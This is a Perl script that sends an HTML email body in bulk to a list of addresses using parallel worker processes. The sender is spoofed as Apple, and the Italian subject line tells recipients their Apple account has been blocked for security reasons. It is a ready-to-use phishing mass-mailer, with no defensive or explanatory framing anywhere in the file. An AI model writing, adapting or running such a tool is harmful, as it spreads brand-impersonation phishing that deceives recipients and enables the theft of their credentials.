use Parallel::ForkManager;
use Mail::Sendmail;
use HTML::Entities;

if (!@ARGV) {
    print "It works like this:\n";
    print "perl send.pl <email_body_file> <email_list_file> <threads>\n";
    exit;
}

my $email_body_file = $ARGV[0];
my $email_list_file = $ARGV[1];
my $threads = $ARGV[2];
if  (!$threads){ $threads = "10";}
my $From = 'Apple<app@rep.com>'; # from addr
my $Subject1 = "Il tuo account Apple &egrave; stato bloccato per motivi di sicurezza"; # subject for mails
my $Subject = decode_entities($Subject1);

my $count = 0;


#open file
#
open FILE,"$email_list_file" or die $!;
my @emails = <FILE>;
chomp(@emails);

#count how many emails
#
my $total = @emails;

#open body
#
open FILE, "<$email_body_file" or die $!;
$email_body = do { local $/; <FILE> };


print "[+][".(localtime)."] Started with $threads threads \n\n";
my $forkmanager = new Parallel::ForkManager($threads);
        foreach $rcpt (@emails) {
            $rcpt =~ s/\s+//g;            
                $forkmanager->run_on_start(
                    sub {
                    $count++;
                    }
                );
            my $processid = $forkmanager->start() and next;		
            doSend($rcpt);
        }
        $forkmanager->wait_all_children();


sub doSend {
    my $rcpt = $_[0];

    sendmail(
        From    => "$From",
        To      => "$rcpt",
        Subject => "$Subject",
        Message => "$email_body",
        'content-type' => "text/html; charset=\"iso-8859-1\""
    );

    $forkmanager->finish;
}
print "\n";
print "Finished $total mails\n";
